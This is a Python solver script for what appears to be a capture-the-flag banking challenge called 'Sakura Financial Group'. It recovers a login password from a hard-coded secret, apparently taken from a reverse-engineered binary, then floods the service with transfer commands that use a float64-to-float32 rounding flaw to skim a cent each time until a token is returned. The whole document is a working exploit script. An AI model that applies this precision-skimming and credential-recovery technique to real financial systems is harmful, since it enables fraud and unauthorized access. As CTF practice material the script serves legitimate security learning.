#!/usr/bin/env python3
"""
Solver for Bank 2 — Sakura Financial Group
Exploit: IEEE 754 Precision — double loses $0.01 when cast to float32

Usage: python3 solve_bank2.py <host> [port]
"""
import socket, time, sys, hashlib, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9002

# Reverse-engineered from auth_node_2.elf: HMAC-like SHA1 of epoch window
SAKURA_SECRET = b"sakura_temporal_seed_v2"

def get_password():
    import struct as st
    window = int(time.time()) // 60
    window_bytes = st.pack(">Q", window)
    h = hashlib.sha1(SAKURA_SECRET + window_bytes).hexdigest()
    return h[:8]

# IEEE 754 magic: 0.010000001192092896 as float64 → 0.01 as float32 → diff = 0.0000000119...
# Actually: server casts to float32 via struct.pack('f')
# We need: value such that float64(value) - float32(value) >= 0.009999
MAGIC = "0.010000001192092896"
DELAY = 1 / 150


def solve():
    password = get_password()
    print(f"[*] Connecting to {HOST}:{PORT}")
    print(f"[*] Password (HMAC-SHA1 window): {password}")

    s = socket.socket()
    s.connect((HOST, PORT))
    s.settimeout(10)

    def recv_prompt(p):
        buf = b""
        while p.encode() not in buf:
            buf += s.recv(4096)
        return buf.decode(errors="replace")

    recv_prompt("Password: ")
    s.sendall((password + "\n").encode())

    welcome = recv_prompt("sakura> ")
    print(welcome.strip())

    if "ACCESS DENIED" in welcome or "mismatch" in welcome:
        print("[-] Auth failed — password may have rotated. Re-run script.")
        s.close()
        return None

    token = None
    count = 0
    t_start = time.time()

    print(f"[*] Starting IEEE 754 exploit — magic value: {MAGIC}")

    while not token:
        s.sendall(f"transfer {MAGIC}\n".encode())
        resp = b""
        while b"sakura> " not in resp:
            resp += s.recv(4096)
        resp = resp.decode(errors="replace")

        count += 1
        if count % 1000 == 0:
            elapsed = time.time() - t_start
            rate = count / elapsed
            print(f"\r[*] Tx: {count:,} | ${count/100:.2f} | {rate:.0f}/s", end="", flush=True)

        if "TOKEN_" in resp:
            for line in resp.split("\n"):
                if "TOKEN_" in line:
                    token = line.split()[-1].strip()
            break

        if "locked" in resp.lower():
            print("\n[-] Locked!"); break

        time.sleep(DELAY)

    print(f"\n[+] DONE — {count:,} tx")
    if token:
        print(f"[+] TOKEN: {token}")
        with open("tokens.txt", "a") as f:
            f.write(f"BANK2:{token}\n")
    s.close()
    return token


if __name__ == "__main__":
    solve()
